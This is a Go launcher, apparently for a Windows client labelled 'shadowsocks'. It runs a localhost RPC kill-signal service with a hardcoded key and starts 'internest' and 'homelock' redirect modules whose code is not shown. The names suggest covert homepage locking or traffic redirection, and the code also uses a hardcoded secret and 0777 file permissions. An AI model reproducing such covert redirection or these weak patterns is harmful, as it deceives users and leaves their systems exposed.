package main

import (
	"github.com/ssoor/fundadore/assistant"
	"errors"
	"flag"
	"fmt"
	"net"
	"net/http"
	"net/rpc"
	"os"
	"strings"
	"time"

	"os/signal"

	"github.com/ssoor/fundadore/log"
	"github.com/ssoor/fundadore/common"
	"github.com/ssoor/fundadore/config"
	
	"github.com/ssoor/tracksocks/redirect"
	"github.com/ssoor/tracksocks/internest"
)

const (
	YouiverseSinnalNotifyKey string = "6491628D0A302AA2"
)

const (
	SignalKill = iota
	SignalTermination
)

type SignalArgs struct {
	Level  uint
	Signal int

	Kay string
}

type SignalReply struct {
	Kay string
}

type Signal struct {
	Level uint
}

func (s *Signal) Notify(args *SignalArgs, reply *SignalReply) error {
	if false == strings.EqualFold(args.Kay, YouiverseSinnalNotifyKey) {
		return errors.New("Unauthorized access")
	}

	switch args.Signal {
	case SignalKill:
		if s.Level > args.Level { // 运行级别高于通知方级别，不予退出，并通知对方退出
			reply.Kay = YouiverseSinnalNotifyKey
			break
		}
		log.Info("[NITIFY] New youniverse notify current process exit.")
		common.ChanSignalExit <- os.Kill
	case SignalTermination:
		log.Info("[NITIFY] New youniverse notify current process termination.")
		common.ChanSignalExit <- os.Kill
	}

	return nil
}

func getSignalExitStatus(level uint) error {
	out := make(chan error, 1)

	go func() {
		client, err := rpc.DialHTTP("tcp", "localhost:7122")
		if err != nil {
			out <- nil
			return
		}

		args := &SignalArgs{
			Level:  level,
			Signal: SignalKill,

			Kay: YouiverseSinnalNotifyKey,
		}

		reply := &SignalReply{}

		if err = client.Call("Signal.Notify", args, &reply); nil != err && strings.EqualFold(reply.Kay, YouiverseSinnalNotifyKey) {
			out <- errors.New(fmt.Sprint("Old youniverse notify current process exit."))
			return
		}

		time.Sleep(1 * time.Second)
		out <- nil
	}()

	select {
	case <-time.After(3 * time.Second):
		return nil
	case err := <-out:
		return err
	}
}

// func notifySignalTerminate() (bool, error) {
// 	client, err := rpc.DialHTTP("tcp", "localhost:7122")
// 	if err != nil {
// 		return false, err
// 	}

// 	args := &SignalArgs{
// 		Level:  0,
// 		Signal: SignalTermination,

// 		Kay: YouiverseSinnalNotifyKey,
// 	}

// 	reply := &SignalReply{}
// 	err = client.Call("Signal.Notify", args, &reply)
// 	if err != nil {
// 		return false, errors.New(fmt.Sprint("Notify old youniverse exit error:", err))
// 	}

// 	time.Sleep(2 * time.Second)

// 	return true, nil
// }

func startSignalNotify(level uint) {
	rpcSignal := &Signal{
		Level: level,
	}

	rpc.Register(rpcSignal)
	rpc.HandleHTTP()

	listen, err := net.Listen("tcp", "localhost:7122")
	if err != nil {
		log.Warning("listen rpc signal error:", err)
	}

	http.Serve(listen, nil)
}

func goRun(debug bool, weight uint, guid string, account string) {
	var succ bool
	var err error
	buildVer := "20170215"
	log.Info("[MAIN] Version:", buildVer)
	log.Info("[MAIN] Shadowsocks guid:", guid)
	log.Info("[MAIN] Shadowsocks weight:", weight)
	log.Info("[MAIN] Shadowsocks account name:", account)
	
	defer func() {
		log.Info("[EXIT] Shadowsocks start is", succ,", error:", err)

		if false == succ {
			common.ChanSignalExit <- os.Kill
		}
	}()
	
	var isFirst bool
	if isFirst, err = assistant.IsFirstRuning("Global\\UNIQUE_PROCESS_SHADOWSOCKS"); !isFirst {
		if nil == err {
			err = errors.New("already process running")
		}
		return
	}

	log.Info("[MAIN] Get the program initialization parameters...")
	config, err := config.GetSettings(buildVer, account, guid)
	if err != nil {
		return
	}

	if debug {
		config.Redirect.Encode = false
		log.Info("[MAIN] Current starting to debug...")
	}

	// 由于其内部需要调用一个下发组建,所以需要在下发系统工作完成后执行.
	log.Info("[MAIN] Start internest module:")
	succ, err = internest.StartInternest(account, guid, config.Internest)
	log.Info("[MAIN] Internest start stats:", succ, ", error:", err)
	if false == succ {
		return
	}

	log.Info("[MAIN] Start homelock module:")
	succ, err = redirect.StartRedirect(account, guid, config.Redirect)
	log.Info("[MAIN] Homelock start stats:", succ, ", error:", err)
	if false == succ {
		return
	}

	err = nil
	succ = true
}

func initLogger(logPath string, logFileName string) (*os.File, error) {
	logFileDir := os.ExpandEnv(logPath)

	os.MkdirAll(logFileDir, 0777)
	logFilePath := logFileDir + "\\" + logFileName

	os.Remove(logFilePath)
	file, err := os.OpenFile(logFilePath, os.O_CREATE|os.O_TRUNC, 0777)
	if err != nil {
		return nil, err
	}

	log.SetOutputFile(file)
	return file, err
}

func main() {
	var debug bool
	var weight uint
	var guid, account string

	signal.Notify(common.ChanSignalExit, os.Interrupt, os.Kill)

	flag.UintVar(&weight, "weight", 0, "program running weight")
	flag.BoolVar(&debug, "debug", false, "Whether to start the debug mode")
	flag.StringVar(&guid, "k", "auto", "unique identifier, used to obtain user configuration")
	flag.StringVar(&account, "account", "everyone", "user name, used to obtain user configuration")

	flag.Parse()
	logFile, err := initLogger("${APPDATA}\\SSOOR", "shadowsocks.log")
	if nil != err {
		log.Warning("open log file error:", err.Error())
	}

	defer logFile.Close()
	defer log.Info("[EXIT] The shadowsocks has finished running, exiting...")

	go goRun(debug, weight, guid, account)
	<-common.ChanSignalExit
}
